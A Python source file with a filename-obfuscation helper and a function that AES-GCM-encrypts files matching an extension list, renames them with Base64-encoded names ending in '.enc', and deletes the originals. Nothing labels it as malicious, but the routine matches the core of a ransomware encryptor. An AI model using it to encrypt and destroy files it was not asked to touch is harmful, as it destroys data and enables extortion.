from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from pathlib import Path
import os
import base64

CHUNK_SIZE = 64 * 1024  # 64KB

def obfuscate_filename(filename: str) -> str:
    """
    Obfuscates the filename (without change the extension)
    using Base64 URL-safe encoding.
    
    Args:
        filename (str): The original filename (e.g. 'document.txt')

    Returns:
        str: Obfuscated filename with the same extension
    """
    if not filename or not isinstance(filename, str):
        raise ValueError("Filename must be a non-empty string")
    
    # Separate name and extension
    name, ext = os.path.splitext(filename)

    # Encode the name part
    encoded_bytes = base64.urlsafe_b64encode(name.encode("utf-8"))
    encoded_str = encoded_bytes.decode("utf-8").rstrip("=") # Removes padding for shorter names

    return (f"{encoded_str}{ext}")


def encrypt_file(path, key, extension_list):
    if path.suffix == ".enc":
        raise ValueError(f"File may already be encrypted {path}")

    if path.suffix.lower() not in extension_list:
        return

    obfuscated_name = obfuscate_filename(path.name)
    enc_path = path.with_name(obfuscated_name + ".enc")
    tmp = enc_path.with_suffix(".tmp")

    iv = os.urandom(12)
    encryptor = Cipher(
        algorithms.AES(key),
        modes.GCM(iv),
        backend=default_backend()
    ).encryptor()

    print(f"Encrypting {path} to {enc_path}")
    
    with open(path, "rb") as f_in, open(tmp, "wb") as f_out:
        f_out.write(iv)  # store IV at start

        while chunk := f_in.read(CHUNK_SIZE):
            f_out.write(encryptor.update(chunk))

        f_out.write(encryptor.finalize())
        f_out.write(encryptor.tag)

    tmp.replace(enc_path)
    path.unlink()
